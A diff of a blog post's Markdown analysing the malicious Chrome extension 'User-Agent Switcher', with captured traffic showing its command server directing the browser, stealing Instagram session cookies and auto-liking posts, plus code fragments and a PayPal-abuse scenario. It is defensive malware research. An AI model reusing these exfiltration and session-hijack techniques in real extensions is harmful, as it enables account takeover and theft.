@@ -1,9 +1,9 @@
 ---
 layout: post
-title: "Inside 'User-Agent Switcher': The Dark Side of Influencer Promotion"
+title: "Inside 'User-Agent Switcher' - a Malicious Extension"
 permalink: /2020/inside-user-agent-switcher-malicious-extension/
 description: "In a dystopian future where 'followers' and 'likes' can turn one person's social media account into a million-dollar brand-deal powerhouse, those unoriginal enough will pay hundreds or thousands of dollars to try to enter the social media stratosphere through shady deals and malicious methods. Oh, wait."
-date: 2020-10-12 00:00:00
+date: 2020-10-13 00:00:00
 tags:
 - malware
 - extension
@@ -14,20 +14,211 @@ tags:
 
 ## Observation
 
-Spinning up resources to test this extension and monitor its traffic was simple. Since I didn't have an Instagram account tied to my phone, I signed up for one that I could comfortably destroy. Extensions obey Chrome's connection settings, so all I needed was a VM on an isolated network with Chrome and [Burp Suite](https://portswigger.net/burp). After installing the extension and restarting my browser for good measure, the results started rolling in quickly.
+Spinning up resources to test this extension and monitor its traffic was simple. Since I didn't have an Instagram account tied to my phone, I signed up for one that I could comfortably destroy. Extensions obey Chrome's connection settings, so all I needed was a VM on an isolated network with Chrome and [Burp Suite](https://portswigger.net/burp). After installing the extension and restarting my browser for good measure, the results started rolling in.
 
+#### Initial Contact & Socket.IO
 
+First, a number of connections are rapidly made over HTTPS to the domain specified as the extension's author, `https://www.useragentswitch.com`:
 
-Contacts an unknown domain
-Sits for a couple minutes
-Begins browsing automatically to sites
+```
+Requested URL: /socket.io/?EIO=3&transport=polling&t=NK1TZnJ
+Response: 96:0{"sid":"MZhr5sp7_Ws-V9R_Afs8","upgrades":["websocket"],"pingInterval":25000,"pingTimeout":5000}2:40
 
-socket.io?
-websocket starts
-heartbeats frequently
-events for command and control
+Requested URL: /socket.io/?EIO=3&transport=websocket&sid=MZhr5sp7_Ws-V9R_Afs8
+Response: 
 
-malicious af
+Requested URL: /socket.io/?EIO=3&transport=polling&t=NK1Ta5m&sid=MZhr5sp7_Ws-V9R_Afs8
+Response: 65:42["handlerData",{"type":"xmlhttprequest","url":"instagram.com"}]
+
+Requested URL: /socket.io/?EIO=3&transport=polling&t=NK1Ta9O&sid=MZhr5sp7_Ws-V9R_Afs8
+Response: 1:6
+```
+
+Dropping the only most recognizable string into google - `socket.io` - we quickly learn this malware is establishing a WebSocket using [Socket.IO](https://socket.io), a popular engine for establishing and managing bidirectional WebSockets. The [internals](https://socket.io/docs/internals/) and [protocol](https://github.com/socketio/engine.io-protocol) documentation partially explained the initialization sequence we just witnessed:
+
+- The first response contains instructions for the client to change transport protocols to using a WebSocket, and includes a Session ID `MZhr5sp7_Ws-V9R_Afs8`, as well as frequency parameters for pinging and timeout (25 seconds and 5 seconds, respectively).
+- The third response is a message not present in the documentation, and certainly suspicious since this isn't an Instagram-centric socket handler. We'll come back to this later.
+- ... and the fourth response is simply a [noop](https://en.wikipedia.org/wiki/NOP_(code)).
+
+Switching over to the WebSockets tab, a few messages had been exchanged which confirm the upgrade to the new transport layer:
+
+```
+Client -> Server:
+2probe
+Server -> Client:
+3probe
+Client -> Server:
+5
+```
+
+Then the only communication for a few minutes is  "pings" and "pongs" to ensure the socket is and remains alive:
+
+```
+Client -> Server:
+2
+Server -> Client:
+3
+```
+
+#### Malicious Operations on Facebook
+
+Two minutes and ten seconds of heartbeats later, the server sends a longer message over the WebSocket:
+
+```
+Server -> Client
+42["createFetch",{"callBack":"initCallBackFB","uri":"https://www.facebook.com/","attr":
+{"credentials":"include","headers":{"accept":"text/html,application/xhtml+xml,application/
+xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+"origin-zzz":"https://www.facebook.com","sec-fetch-dest":"document",
+"sec-fetch-mode":"navigate","se-zzzc-fetch-site":"same-origin","se-zzzc-fetch-user":"?1",
+"upgrade-insecure-requests":"1"},"referrerPolicy":"no-referrer-when-downgrade","body":null,
+"method":"GET","mode":"cors"}}]
+```
+
+Looking at the Socket.IO docs, a message type of 42 is read as "engine: 4, socket: 2" and is referenced as MESSAGE_EVENT - so it seems that our malicious extension is being told to perform an action (a `createFetch` event, whatever that means). Though it didn't take much wondering, as my browser sprang to life and made a request to Facebook:
+
+```
+Host: www.facebook.com
+Connection: close
+accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+upgrade-insecure-requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.27 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/601.1.27
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: sb=djl9XybrliHbaXtut9kQZ5f-; fr=105lau0rVCvNUPaQy.AWVtW4Eyu8OUoPBfn0On9TJgvQM.BffTl2.0k.AAA.0.0.BffT6F.AWUj8rhsvQE
+origin: https://www.facebook.com
+sec-fetch-user: ?1
+```
+
+What's important to note here is that the headers are set to innocuous values. While the initial requests to `www.useragentswitch.com` included an Origin header which included the Chrome extension ID, this request was "clean" and contained no such trace. Further, the odd `-zzz` strings sent in the WebSocket event have disappeared - probably by some filtering and reconstruction locally.
+
+After receiving a response from Facebook, my browser forwards the entire response back to the server as another MESSAGE_EVENT, this time titled `initCallBackFB` (which was specified in the `callBack` key of the original `createFetch` event). I've omitted the Content Security Policy and HTML from the response for brevity:
+
+```
+Client -> Server
+42["initCallBackFB",{"headerEntries":[["alt-svc","h3-29=\":443\"; ma=3600,h3-27=\":443\"; 
+ma=3600"],["cache-control","private, no-cache, no-store, must-revalidate"],["connection",
+"close"],["content-security-policy","<FACEBOOK CSP OMITTED FOR BREVITY>"],["content-type",
+"text/html; charset=\"utf-8\""],["date","Wed, 07 Oct 2020 05:11:02 GMT"],["expires","Sat, 01 
+Jan 2000 00:00:00 GMT"],["pragma","no-cache"],["strict-transport-security","max-age=15552000; 
+preload"],["vary","Accept-Encoding"],["x-content-type-options","nosniff"],["x-fb-debug",
+"0e7D12VGda2oR5J84JmIore1H9pXLIstEI084Ex/MpeTOqgOaaEY7n7HU5L/YgcT0NVxFAfs0HT7B0gpXPfTJQ=="],
+["x-frame-options","DENY"],["x-xss-protection","0"]],"data":"<HTML OMITTED FOR BREVITY>",
+"ok":true,"status":200}]
+```
+
+In effect, the server is remotely controlling my browser, and reading the responses that it gets. Had I been logged in, an attacker would have been reading off my friends' and family's activity feed. While that's a gross violation of privacy, at least my account wasn't compromised, since the response data doesn't include my session token.
+
+The server does not send more requests for Facebook after this point, so it seems that the serverside logic is fairly complex, and uses the response data to check if a user is logged in before attempting to continue using their account. Confirming with ufo56, had I been logged in, my account would probably have been used to promote influencer content:
+
+> I first discovered it [because it accessed my] Facebook, but there was maybe 2-3 likes/day ...
+
+#### Malicious Operations on Instagram
+
+One minute and two seconds later, the server sends a new `createFetch` event, instructing my browser to load Instagram:
+
+```
+Server -> Client
+42["createFetch",{"callBack":"initCallBack","uri":"https://www.instagram.com/","attr":
+{"credentials":"include","headers":{"origin-zzz":"https://www.instagram.com",
+"sec-fetch-dest":"document","sec-fetch-mode":"navigate","se-zzzc-fetch-site":"none",
+"upgrade-insecure-requests":"1"},"referrerPolicy":"no-referrer-when-downgrade","body":null,
+"method":"GET","mode":"cors"}}]
+```
+
+Now, our malware author gets lucky - I'm logged in to my dummy account. A request to Instagram is made, but to my surprise, two separate events are sent. One we expect, which is the callback containing the response data - identical to what we saw for Facebook, except this event is titled `initCallBack` instead of `initCallBackFB`:
+
+```
+Client -> Server
+42["initCallBack",{"headerEntries":[["access-control-allow-credentials","true"],
+["access-control-allow-origin","https://www.instagram.com"],["access-control-expose-headers",
+"X-IG-Set-WWW-Claim"],["alt-svc","h3-29=\":443\"; ma=3600,h3-27=\":443\"; ma=3600"],
+["cache-control","private, no-cache, no-store, must-revalidate"],["connection","close"],
+["content-language","en"],["content-length","47356"],["content-security-policy","<INSTAGRAM 
+CSP OMITTED FOR BREVITY>"],["content-type","text/html; charset=utf-8"],["date","Wed, 07 Oct 
+2020 05:12:04 GMT"],["expires","Sat, 01 Jan 2000 00:00:00 GMT"],["pragma","no-cache"],
+["strict-transport-security","max-age=31536000"],["vary","Accept-Language, Cookie, 
+Accept-Encoding"],["x-accel-buffering","no"],["x-aed","20"],["x-content-type-options",
+"nosniff"],["x-fb-trip-id","1679558926"],["x-frame-options","SAMEORIGIN"],["x-xss-protection",
+"0"]],"data":"<HTML OMITTED FOR BREVITY>","ok":true,"status":200}]
+```
+
+The other is a surprise. My request headers, including my session cookie, are also stolen. The malware author could now hijack my current session with Instagram and browse as me from wherever they are in the world. While they could technically do something equivalent with some clever programming and a lot of `createFetch` events, this makes it even more trivial.
+
+Notably, the `requestHeadersHandler` event wasn't specified in the `createFetch` event that was sent to my browser, so I'll need to hunt down why this event was triggered when looking at the malicious extension's internals:
+
+```
+Client -> Server
+42["requestHeadersHandler",{"frameId":0,"initiator":"chrome-extension://
+clddifkhlkcojbojppdojfeeikdkgiae","method":"GET","parentFrameId":-1,"requestHeaders":[
+{"name":"se-zzzc-fetch-site","value":"none"},{"name":"origin-zzz","value":"https://www.
+instagram.com"},{"name":"upgrade-insecure-requests","value":"1"},{"name":"User-Agent",
+"value":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.
+4240.75 Safari/537.36"},{"name":"Accept","value":"*/*"},{"name":"Sec-Fetch-Site",
+"value":"none"},{"name":"Sec-Fetch-Mode","value":"cors"},{"name":"Sec-Fetch-Dest",
+"value":"empty"},{"name":"Accept-Encoding","value":"gzip, deflate, br"},
+{"name":"Accept-Language","value":"en-US,en;q=0.9"},{"name":"Cookie",
+"value":"ig_did=0BD6DADB-8BE2-4CAC-8AD2-7C276D9054B6; mid=X305GAAEAAHAOaH2mauPtYA6R8pf; 
+ig_nrcb=1; csrftoken=zepUGi0jiUJB7GfTBQ4cC2F1ZYn7J6W5; ds_user_id=43092726024; 
+sessionid=43092726024%3AfQVgHKyfgJh3O7%3A19"}],"requestId":"65","tabId":-1,
+"timeStamp":1602047524229.481,"type":"xmlhttprequest","url":"https://www.instagram.com/"}]
+```
+
+The next steps should not be much of a surprise, but the server appears to analyze the request to see if there's an active login, and then proceeds with its ultimate goal: User-Agent Switcher finally starts generating revenue by promoting content, most likely for customers paying the malware author. First, a specific post from a seemingly-paying customer (one @bebe_quiche) is loaded with another `createFetch` event:
+
+```
+Server -> Client
+42["createFetch",{"callBack":"getPostParamsHandler","uri":"https://www.instagram.com/p/
+CFkWDmNpFfN/","attr":{"headers":{"sec-fetch-dest":"document","sec-fetch-mode":"navigate",
+"se-zzzc-fetch-site":"same-origin","sec-fetch-user":"?1","upgrade-insecure-requests":"1"},
+"referrerPolicy":"no-referrer-when-downgrade","body":null,"method":"GET","mode":"cors",
+"credentials":"include"}}]
+```
+
+After sending the header of the request that my browser made as a `requestHeadersHandler` event, alongside the response (this time called a `getPostParamsHandler` event), the server finds the Like link in the post, and directs my browser to promote @bebe_quiche's post:
+
+```
+Server -> Client
+42["createFetch",{"callBack":"sendLikeHandler","uri":"https://www.instagram.com/web/likes/
+2406145105135425485/like/","attr":{"credentials":"include","method":"POST","mode":"cors",
+"headers":{"accept":"*/*","sec-fetch-dest":"empty","sec-fetch-mode":"cors",
+"se-zzzc-fetch-site":"same-origin","Referer-zzz":"https://www.instagram.com/p/CFkWDmNpFfN/",
+"Origin-zzz":"https://www.instagram.com","content-type":"application/x-www-form-urlencoded",
+"x-ig-app-id":"936619743392459","x-csrftoken":"zepUGi0jiUJB7GfTBQ4cC2F1ZYn7J6W5",
+"x-instagram-ajax":"38f51516507c","x-ig-www-claim":0,"x-requested-with":"XMLHttpRequest"},
+"body":""}}]
+```
+
+Which it does successfully, *again* reporting the request headers with `requestHeadersHandler`, alongside a new `sendLikeHandler` event:
+
+```
+Client -> Server
+42["sendLikeHandler",{"headerEntries":[["access-control-allow-credentials","true"],
+["access-control-allow-origin","https://www.instagram.com"],["access-control-expose-headers",
+"X-IG-Set-WWW-Claim"],["alt-svc","h3-29=\":443\"; ma=3600,h3-27=\":443\"; ma=3600"],
+["cache-control","private, no-cache, no-store, must-revalidate"],["connection","close"],
+["content-language","en"],["content-length","16"],["content-security-policy","<INSTAGRAM 
+CSP OMITTED FOR BREVITY>"],["content-type","application/json; charset=utf-8"],["date","Wed, 
+07 Oct 2020 05:12:07 GMT"],["expires","Sat, 01 Jan 2000 00:00:00 GMT"],["pragma","no-cache"],
+["strict-transport-security","max-age=31536000"],["vary","Accept-Language, Cookie"],["x-aed",
+"20"],["x-content-type-options","nosniff"],["x-fb-trip-id","1679558926"],["x-frame-options",
+"SAMEORIGIN"],["x-ig-set-www-claim","hmac.AR2Ugv6Y86E7AjJ-5QIdNOX8A6Re0l5aSQ7Gmv3ykyMMCsxn"],
+["x-robots-tag","noindex"],["x-xss-protection","0"]],"data":"{\"status\": \"ok\"}","ok":true,
+"status":200}]
+```
+
+After this, the server continues sending `createFetch` events for loading Instagram posts and liking them, and no new event types or interactions were observed. For your exploration, I have also included a brief [traffic log](/2020/inside-user-agent-switcher-malicious-extension/traffic.xml) exported from Burp with initial WebSocket setup as well as the requests and responses generated by these events (minus HTML data, as it only added bloat - not context).
+
+## Analysis
+
+The key, of course, is to have as many browsers infected as possible, and generate likes with them frequently. Leaving this running for a while, I observed that an idle system is used to like content on Instagram as frequently as once every one-and-a-half minutes:
+
+![WebSocket events, annotated, with heartbeats removed.](/2020/inside-user-agent-switcher-malicious-extension/websocket-timing.png)
+
+At an estimate of $0.01/like, 30 likes/hour, and 8 hours active/day ([thanks, COVID](https://www.youtube.com/watch?v=TK3QFL9akFg)), that's a cool $2.4/day/browser, doing activity which would be unnoticed by many users and can run on any system that can run Chrome.
 
 ## Dissection
 
@@ -56,19 +247,19 @@ Even better, we got another lead only a few lines away. What is `esolutions.se/w
 
 Looks like our malware authors picked a common tactic: downloading an existing extension, inserting malware, uploading their malicious copy to the Chrome Web Store, and then [inflating the download count](https://www.theregister.com/2020/05/28/chrome_web_store_fraud/) to manipulate users into trusting it as "safe."
 
-Fortunately for us, this gives us a really powerful method to trim down the code we'll need to look through. Unpacking the clean User-Agent Switcher extension (including beautifying its JavaScript), aligning the file structure (to account for the different version folder), and [diffing](https://linux.die.net/man/1/diff) the two extension folders, only a few files are different: `js/background.min.js`, `js/bootstrap.min.js`, `js/JsonValues.min.js`, `manifest.json`, `_metadata/computed_hashes.json`, and `_metadata/verified_contents.json`. Eliminating irrelevant files (metadata and contents), as well as `js/bootstrap.min.js` which contains different *comments* but not different *code*, we're left with only two files to go through: `js/JsonValues.min.js` and `js/background.min.js`.
+Fortunately for us, this gives us a really powerful method to trim down the code we'll need to look through. Unpacking the clean User-Agent Switcher extension (including beautifying its JavaScript), aligning the file structure (to account for the different version folder), and [diffing](https://linux.die.net/man/1/diff) the two extension folders, only a few files are different: `js/background.min.js`, `js/bootstrap.min.js`, `js/JsonValues.min.js`, `manifest.json`, `_metadata/computed_hashes.json`, and `_metadata/verified_contents.json`. Eliminating irrelevant files (metadata and contents), as well as `js/bootstrap.min.js` which contains different *comments* but not different *code*, we're left with only two files to go through: `js/JsonValues.min.js` and `js/background.min.js`, whose diff with their nonmalicious counterparts is [here](/2020/inside-user-agent-switcher-malicious-extension/unpacked-contents.diff).
 
 #### js/JsonValues.min.js
 
-Taking a look at the [diff](/2020/inside-user-agent-switcher-malicious-extension/unpacked-contents.diff), `js/JsonValues.min.js` only had content appended to it - pruning through, it's quickly apparent that most or all of the added content is the [Socket.IO](https://socket.io/) client. I wasn't certain that was the only content added to this file, so I ran it through [JS NICE](http://www.jsnice.org/) - a project which attempt to intelligently reassemble obfuscated or minified JavaScript by [SRI Lab](http://www.sri.inf.ethz.ch/) at [ETH Zürich](http://www.ethz.ch/) - to see if anything caught my eye after it was automatically annotated. Nothing did, so I took a couple notes and moved on.
+Taking a look at `js/JsonValues.min.js`, this file had several thousand lines of code appended to it. Pruning through, they're large, socket-oriented functions - so there's a good chance the added content is just the Socket.IO client. I wasn't certain that was the *only* content added to this file, so I ran it through [JS NICE](http://www.jsnice.org/) - a project which attempt to intelligently reassemble obfuscated or minified JavaScript by [SRI Lab](http://www.sri.inf.ethz.ch/) at [ETH Zürich](http://www.ethz.ch/) - to see if anything caught my eye after it was automatically annotated. Nothing did, so I took a couple notes and moved on.
 
 #### js/background.min.js
 
-With a much more complex [diff](/2020/inside-user-agent-switcher-malicious-extension/unpacked-contents.diff), `js/background.min.js` is the real "brain" of the User-Agent Switcher's malicious components, whose activity is deceptively simple. Removing the noise from the version and minification differences between the extensions we're comparing, the malicious content the author added is only ~30 lines long. While simple, it gives the malware author more than enough control over a user's browser to do nefarious things.
+It is quickly apparent that `js/background.min.js` contains most if not all of User-Agent Switcher's malicious components, especially since we already know that the `www.useragentswitch.com` domain is contained within it. Removing the noise from the version and minification differences between the extensions we're comparing, the malicious content the author added is only ~30 lines long. While simple, it gives the author more than enough control over a user's browser to perform malicious actions.
 
-## Analysis
+## Functionality
 
-The way this malware works is fairly simple, since [Socket.IO](https://socket.io)'s client-side WebSockets library handles the complexities of making, managing, and interacting with WebSockets. However, since it is principally event- and hook-driven, it may be hard to interpret for observers who aren't familiar with JavaScript. We'll go through the malicious code in sections before bringing it all together.
+The way this malware works is fairly simple, since Socket.IO's client-side WebSockets library handles the complexities of making, managing, and interacting with WebSockets. However, since it is principally event- and hook-driven, it may be hard to interpret for observers who aren't familiar with JavaScript. We'll go through the malicious code in sections before bringing it all together.
 
 #### Initializing
 
@@ -95,11 +286,17 @@ async function createFetch(e) {
 }
 ```
 
-#### Capturing Headers & Deobfuscating
+#### Capturing the Request & Overwriting the Origin
 
-The second event hook that is added to the socket is to process `handlerData` events, which lists hosts that User-Agent Switcher would like to intercept headers on outgoing requests for - capturing session cookies, User-Agent strings, and more. User-Agent Switcher also registers a function titled `handler2` which is invoked on all outgoing web requests before the headers are sent, doing two important functions:
+The second event hook that is added to the socket is to process `handlerData` events, which list hosts that User-Agent Switcher would like to intercept headers on outgoing requests for - capturing session cookies, User-Agent strings, and more. Did you remember? This was actually the first malicious event we received from the server in the [Initial Contact & Socket.IO](#initial-contact--socketio) section, though it didn't do anything immediately, it was eventually the reason that headers were stolen for Instagram but not Facebook:
+
+```
+["handlerData",{"type":"xmlhttprequest","url":"instagram.com"}]
+```
+
+User-Agent Switcher also registers a function titled `handler2` which is invoked on all outgoing web requests before the headers are sent, doing two important functions:
 - Checking to see if the domain that a request is being made for is in our local `handlerData` object, and if so, sending an event via `emit()` to the Command and Control server with the headers of the request.
-- Removing any "obfuscating" `-zzz` strings in header parameters from `createFetch` events (presumably to defeat some part of the Chrome Web Store's malware detection capabilities), and reconstructing the headers afterwards.
+- Removing any "obfuscating" `-zzz` strings in header parameters from `createFetch` events, and reconstructing the headers afterwards. This has a side (or perhaps main) benefit of overwriting the headers that Chrome had automatically built for the request , quietly erasing the `Origin` header (see notes from the [Malicious Operations on Facebook](#malicious-operations-on-facebook) subsection) which would have shown that this request came from an extension.
 
 ```js
 var handlerData = {};
@@ -148,7 +345,7 @@ The most important takeaway is that this malware, while simple, can be instructe
 - Send a `handlerData` event with PayPal's domain (www.paypal.com)
 - Send a `createFetch` event for PayPal's dashboard
 
-At that point, the malware author now has my session token, and could choose between executing requests remotely or on their own infrastructure (as they also have my browser information). If they chose to execute remotely, they would simply need to send more `createFetch` events to collect context (ex. how much money is in my account) and then POST transfer requests to PayPal's API. The only protection I have is that _maybe_ PayPal would ask me to reenter my password if the transfer account was large enough or the user is not known - which extensions running in the background (thankfully) wouldn't be able to bypass without your password.
+At that point, the malware author now has my session token, and could choose between executing requests remotely or on their own infrastructure (as they also have my browser information). If they chose to execute remotely, they would simply need to send more `createFetch` events to collect context (ex. how much money is in my account) and then POST transfer requests to PayPal's API. The only protection I have is that *maybe* PayPal would ask me to reenter my password if the transfer account was large enough or the user is not known - which extensions running in the background (thankfully) wouldn't be able to bypass without your password.
 
 However, it could be updated to have functionality which would bypass the need for your password. Modifying money transfer requests so they will be sent to an attacker-controlled account would be a trivial change, and is functionally similar to how `handler` (from the clean version of User-Agent Switcher) and `handler2` hook to outgoing requests for rewriting. Further, it's unlikely that this behavior would be detected by Google's automatic and manual review processes, since they haven't detected the techniques used by this malware - as long as the hook was written similarly and didn't directly reference PayPal, it would probably be approved without a second thought.
 
@@ -156,9 +353,9 @@ However, it could be updated to have functionality which would bypass the need f
 
 Which brings us to the most disappointing section - knowing more than enough about how this malware works, and reporting it to parties which host or support it, has there been any action to remove it?
 
-**As of Monday, October 12, 2020: No.**
+**As of Tuesday, October 13, 2020: No.**
 
-Despite reaching the top of [r/cybersecurity](https://reddit.com/r/cybersecurity), getting some very bad reviews, and having a bunch of people (including me) report this extension to Google over the past week ([u/ufo56](https://reddit.com/user/ufo56)'s post was Tuesday, October 06 2020), it is currently still available for download from the Chrome Web Store.
+Despite reaching the top of [r/cybersecurity](https://reddit.com/r/cybersecurity), getting some very bad reviews, and having a bunch of people (including me) report this extension to Google over the past week (ufo56's [post](https://www.reddit.com/r/cybersecurity/comments/j6gg2q/chrome_extension_with_100k_installs_makes_your/) was Tuesday, October 6th), it is currently still available for download from the Chrome Web Store.
 
 Any unsuspecting user that has this extension installed is still having their accounts manipulated for influencer promotion, and is at risk of becoming a victim to high-impact attacks on other web services they use - as they have been for *at least* one month (since the extension was updated on September 7th 2020, and possibly people have been at risk for much longer than that based on the oldest comments).
 
@@ -168,7 +365,7 @@ With the increased pressure from this writeup - and hopefully positive community
 
 While it's not the most potent or original malware ever seen, it serves as an important reminder to be diligent and thoughtful about how to manage our safety online. Most everyone who has read through this post probably knows these, so if nothing else, *tell your friends* so they can get a deeper understanding of how to stay secure.
 
-- **Just because it's on the Chrome Web Store, doesn't mean it's safe.** This malicious extension isn't an [isolated incident](https://threatpost.com/500-malicious-chrome-extensions-millions/152918/). I would love to live in a world where I could simply say "Google Trust & Safety took care of this concern for you," but we're not there yet in the same way that Apple can't stop all Mac malware, Microsoft can't stop all Windows malware, ad infinitum. This is the price we pay for diverse application marketplaces: less per-app security supervision. Therefore, users should always be thoughtful and careful when downloading applications, even off company-run app stores.
+- **Just because it's on the Chrome Web Store, doesn't mean it's safe.** This malicious extension isn't an [isolated incident](https://threatpost.com/500-malicious-chrome-extensions-millions/152918/). I would love to live in a world where I could simply say "Google Trust & Safety took care of this concern for you," but we're not there yet, and we probably never will be able to say so with 100% certainty. This is the price we pay for diverse application marketplaces - for the Chrome Web Store to feature eighteen different "user agent switcher" extensions, there will necessarily be less per-app security supervision than if Google only allowed three. Therefore, users should always be thoughtful and careful when downloading applications, even off company-run app stores.
 - **Don't install extensions from untrusted authors.** [Downloads](https://www.theregister.com/2020/05/28/chrome_web_store_fraud/) and [reviews](https://www.quora.com/Should-I-boost-my-Chrome-extension-user-base-by-buying-users-and-reviews) can be bought - reputation can't (...[as cheaply](https://www.caoc.org/?pg=facts)). What do people say about the author of the extension you're about to download? Is it a well-known company? Can you make sure it's that company's extension, and not someone pretending to be that company?
 - **Be extra cautious when installing extensions which can 'read and change all your data on the websites you visit.' (or similar)** Extensions that request this permission from your browser can do nearly anything, including impersonate your actions on the sites you use (and sites you don't), like UAS does. ♪ "Anything you can do I can do better... without your knowledge" ♪ isn't quite musical, but it is [pretty close](https://security.stackexchange.com/questions/15259/worst-case-scenario-what-can-a-chrome-extension-do-with-your-data-on-all-websi) to the truth.
 - **If you see something, say something.** When something happens on your computer that you didn't expect - such as likes, posts, emails, or other things appearing which you're fairly sure you didn't create - phone a technologically-adept friend. If you're at work, alert your workplace's IT or Information Security groups. Antimalware will never be perfect, and this extension slips by [61/61](https://www.virustotal.com/gui/file/d5a988742418a06ba6c0649e6ace78eb4bcd061f2222f1a9cc1d97492763cd09/detection) antimalware programs on VirusTotal. Even layered solutions could miss it, and running `www.useragentswitch.com` through some [threat-blocking DNS providers](https://www.ipvoid.com/dns-reputation/), only CleanBrowsing picked it up, and that's likely because it's an [unusually new domain](/2020/inside-user-agent-switcher-malicious-extension/whois-useragentswitch.com.txt).
